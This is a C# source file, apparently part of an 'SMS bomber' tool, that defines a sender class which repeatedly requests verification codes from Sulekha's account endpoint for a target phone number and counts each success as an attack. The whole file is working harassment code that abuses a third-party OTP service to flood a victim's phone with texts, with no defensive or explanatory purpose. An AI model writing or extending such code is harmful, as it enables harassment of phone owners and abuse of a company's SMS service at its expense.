using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Sulekha : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Sulekha";
        private readonly HttpClient Attacker = new HttpClient();

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Get,
                $"https://myaccount.sulekha.com/network/userauthsulv2.aspx?mode=sendvcode&mobilenumber={To}&rnd=0.1");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("{success: true}")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
